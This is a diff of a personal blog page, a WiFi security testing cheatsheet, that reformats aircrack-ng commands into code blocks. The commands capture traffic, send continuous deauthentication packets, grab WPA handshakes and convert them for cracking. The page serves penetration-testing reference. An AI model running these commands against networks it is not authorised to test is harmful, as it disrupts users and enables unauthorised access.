@@ -6,9 +6,26 @@
   <title>WiFi Security Testing Cheatsheet - Dan [the] Salmon</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="description" content="">
-  <meta name="author" content="">
+  <meta name="author" content="Dan Salmon">
   <meta name="keywords" content="">
   <link rel="canonical" href="https://danthesalmon.com/wifi-security-testing-cheatsheet/">
+
+
+  
+  
+  
+  
+  
+  
+
+
+  <meta property="og:image" content="https://danthesalmon.com/../images/me.png" />
+  <meta property="og:site_name" content="danthesalmon.com" />
+  <meta property="og:type" content="object" />
+  <meta property="og:title" content="WiFi Security Testing Cheatsheet" />
+  <meta property="og:url" content="https://danthesalmon.com/wifi-security-testing-cheatsheet/" />
+  <meta property="og:description" content="" />
+
 
   
   
@@ -57,55 +74,74 @@
 <h1 id="prepare-wireless-card">Prepare Wireless Card</h1>
 
 <ul>
-<li><strong>View Network Cards:</strong> iwconfig</li>
-<li><strong>Kill Wireless Processes:</strong> airmon-ng check kill</li>
+<li><strong>View Network Cards:</strong>
+
+<ul>
+<li><code>iwconfig</code></li>
+</ul></li>
+<li><strong>Kill Wireless Processes:</strong>
+
+<ul>
+<li><code>airmon-ng check kill</code></li>
+</ul></li>
 </ul>
 
 <hr />
 
 <h1 id="view-networks">View Networks</h1>
 
-<p>airodump-ng wlan0</p>
+<pre><code>airodump-ng wlan0
+</code></pre>
 
 <hr />
 
 <h1 id="capture-traffic">Capture traffic</h1>
 
-<p>airodump-ng &ndash;bssid 04:A1:51:9F:98:BB &ndash;wps &ndash;write ISSO-WPA2 &ndash;channel 6 wlan0</p>
+<pre><code>airodump-ng --bssid 04:A1:51:9F:98:BB --wps --write ISSO-WPA2 --channel 6 wlan0
+</code></pre>
 
-<p>where:
-* &ndash;bssid   - MAC of router
-* &ndash;wps     - Output WPS information, may be able to try Reaver
-* &ndash;write   - File name to write to. No extension
-* &ndash;channel - Statically set a channel. Don&rsquo;t need to unless de-authing
-* wlan0     - Wireless interface</p>
+<p>where:</p>
+
+<pre>
+--bssid   - MAC of router
+--wps     - Output WPS information, may be able to try Reaver
+--write   - File name to write to. No extension
+--channel - Statically set a channel. Don't need to unless de-authing
+wlan0     - Wireless interface  
+</pre>
 
 <hr />
 
 <h1 id="deauth-do-while-capturing">Deauth - Do while capturing</h1>
 
-<p>aireplay-ng &ndash;deauth 0 -a 04:A1:51:9F:11:11 -c E0:AC:CB:DA:1B:1B wlan0</p>
+<pre><code>aireplay-ng --deauth 0 -a 04:A1:51:9F:11:11 -c E0:AC:CB:DA:1B:1B wlan0
+</code></pre>
 
 <p>where:
-* 0        - Continuously send deauth packets
-* -a       - BSSID of router (from airodump)
-* -c       - STATION of client (From airodump. Not necessary, but preferred)
-* wlan0    - Interface
-* &ndash;deauth - Which aireplay attack to launch</p>
-
-<p>[0|64 ACKs] - How many acknowledgements from AP|client. More=better especially for AP count</p>
+<pre>
+0           - Continuously send deauth packets
+-a          - BSSID of router (from airodump)
+-c          - STATION of client (From airodump. Not necessary, but preferred)
+wlan0       - Interface
+&ndash;deauth     - Which aireplay attack to launch
+[0|64 ACKs] - How many acknowledgements from AP|client. More=better especially for AP count
+</pre></p>
 
 <hr />
 
 <h1 id="automating-de-auth-attack-handshake-grab">Automating de-auth attack/handshake grab</h1>
 
-<p>besside-ng -W -c 6 -b 00:00:11:22:33:44 wlan0</p>
+<pre><code>besside-ng -W -c 6 -b 00:00:11:22:33:44 wlan0
+</code></pre>
 
-<p>where:
-* -W - WPA networks only
-* -c - channel lock
-* -b - BSSID of AP
-* wlan0 - interface</p>
+<p>where:</p>
+
+<pre>
+-W    - WPA networks only
+-c    - channel lock
+-b    - BSSID of AP
+wlan0 - interface
+</pre>
 
 <ul>
 <li>Sort of experimental, will probably get errors</li>
@@ -117,18 +153,23 @@
 
 <h1 id="seperate-out-individual-caps-from-besside-ng-output">Seperate out individual caps from besside-ng output</h1>
 
-<p>pyrit -r wpa.cap -o mytargetnetwork.cap -e mytarget strip</p>
+<pre><code>pyrit -r wpa.cap -o mytargetnetwork.cap -e mytarget strip
+</code></pre>
 
-<p>where:
-* -r - Input file to look at created by besside-ng
-* -o - Output file to create
-* -e - ESSID of network to filter by (alternatively, -b with BSSID of network)</p>
+<p>where:</p>
+
+<pre>
+-r - Input file to look at created by besside-ng
+-o - Output file to create
+-e - ESSID of network to filter by (alternatively, -b with BSSID of network)
+</pre>
 
 <hr />
 
 <h1 id="convert-cap-with-handshake-to-hccap">Convert .cap with handshake to .hccap</h1>
 
-<p>aircrack-ng -J network network.cap</p>
+<pre><code>aircrack-ng -J network network.cap
+</code></pre>
 
 <ul>
 <li>Aircrack already adds .hccap extension to file</li>
